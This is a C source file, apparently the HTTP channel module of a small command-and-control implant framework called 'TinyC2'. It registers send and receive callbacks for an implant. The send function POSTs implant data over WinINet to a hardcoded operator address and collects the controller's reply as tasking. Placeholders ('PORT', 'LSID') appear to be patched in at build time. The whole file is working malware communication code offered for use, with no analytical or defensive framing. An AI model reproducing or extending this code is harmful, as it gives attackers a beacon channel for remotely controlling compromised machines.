#include "channel.h"

#define DBG_PRINTF(x, ...) dprintf("HTTP: "x, ##__VA_ARGS__)

typedef struct {
	CHAR Host[16];
	WORD Port;
} HTTP_CONFIG;

BOOL HttpSend(CHANNEL_CONTEXT* Context, CONST CHAR* Data, DWORD Size, BOOL Register) {
	DWORD 		dwRead		= 0;
	DWORD 		dwTotal		= 0;
	HANDLE 		hHeap 		= GetProcessHeap();
	CHAR*		Buffer 		= NULL;
	CHAR* 		Chunk		= NULL;
	DWORD		ChunkSize 	= 4096;
	HINTERNET 	hSession 	= NULL;
	HINTERNET 	hRequest 	= NULL;
	HINTERNET 	hConnect 	= NULL;
	HTTP_CONFIG Config		= { 0 };


	memcpy(&Config.Host, "123.123.123.123", 15);
	memcpy(&Config.Port, "PORT", sizeof(WORD));

	Context->Data = NULL;
	Context->Size = 0;

	Buffer = (CHAR*)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, 1);
	if (!Buffer) {
		DBG_PRINTF("failed to allocate memory for Buffer\n");
		return FALSE;
	}

	Chunk = (CHAR*)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, 4096);
	if (!Chunk) {
		DBG_PRINTF("failed to allocate memory for Chunk\n");
		RtlFreeHeap(hHeap, 0, Buffer);
		return FALSE;
	}

	if (!(hSession = InternetOpenA("TinyC2/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0))) {
		DBG_PRINTF("InternetOpenA failed: ( %d )\n", GetLastError());
		RtlFreeHeap(hHeap, 0, Chunk);
		RtlFreeHeap(hHeap, 0, Buffer);
		return FALSE;
	}

	if (!(hConnect = InternetConnectA(hSession, Config.Host, Config.Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0))) {
		DBG_PRINTF("InternetConnectA failed ( %d )\n", GetLastError());
		RtlFreeHeap(hHeap, 0, Chunk);
		RtlFreeHeap(hHeap, 0, Buffer);
		goto cleanup;
	}

	if (!(hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0))) {
		DBG_PRINTF("HttpOpenRequestA failed: ( %d )\n", GetLastError());
		RtlFreeHeap(hHeap, 0, Chunk);
		RtlFreeHeap(hHeap, 0, Buffer);
		goto cleanup;
	}

	if (!HttpSendRequestA(hRequest, NULL, 0, (LPVOID)Data, Size)) {
		DBG_PRINTF("HttpSendRequestA failed ( %d )\n", GetLastError());
		RtlFreeHeap(hHeap, 0, Chunk);
		RtlFreeHeap(hHeap, 0, Buffer);
		goto cleanup;
	}

	
	/////////////////////////////////////////////////////////
	DBG_PRINTF("sent %d bytes to %s:%d\n", Size, Config.Host, Config.Port);
	/////////////////////////////////////////////////////////

	do {
		memset(Chunk, 0, ChunkSize);

		if (!InternetReadFile(hRequest, Chunk, ChunkSize - 1, &dwRead)) {
			break;
		}

		if (dwRead > 0) {
			Buffer = (CHAR*)RtlReAllocateHeap(hHeap, HEAP_ZERO_MEMORY, Buffer, dwTotal + dwRead + 1);
			memcpy(Buffer + dwTotal, Chunk, dwRead);
			dwTotal += dwRead;
		}

	} while (dwRead > 0);

	Context->Data = Buffer;
	Context->Size = dwTotal;

	/////////////////////////////////////////////////////////
	DBG_PRINTF("received %d bytes\n", dwTotal);
	/////////////////////////////////////////////////////////

cleanup:
	if (Chunk)
		RtlFreeHeap(hHeap, 0, Chunk);

	if (hRequest)
		InternetCloseHandle(hRequest);
	if (hConnect)
		InternetCloseHandle(hConnect);
	if (hSession)
		InternetCloseHandle(hSession);
	return TRUE;
}

BOOL HttpReceive(CHANNEL_CONTEXT* Context, CHAR** Data, DWORD* Size) {
	*Data = Context->Data;
	*Size = Context->Size;
	return TRUE;
}

BOOL HttpInitialize(CHANNEL_CONTEXT* Context) {
	return TRUE;
}

BOOL HttpCleanup(CHANNEL_CONTEXT* Context) {
	RtlFreeHeap(GetProcessHeap(), 0, Context);
	return TRUE;
}

BOOL go(void* implant, IChannel* channel) {
	DWORD ChannelID;

	channel->Context = RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CHANNEL_CONTEXT));
	if (channel->Context == NULL) {
		return FALSE;
	}

	memcpy(&ChannelID, "LSID", 4);

	channel->ID 		= ChannelID;
	channel->Initialize = HttpInitialize;
	channel->Send 		= HttpSend;
	channel->Receive 	= HttpReceive;
	channel->Cleanup 	= HttpCleanup;
	
	/////////////////////////////////////////////////////////
	DBG_PRINTF("channel %X registred\n", ChannelID);
	/////////////////////////////////////////////////////////

	return TRUE;
}
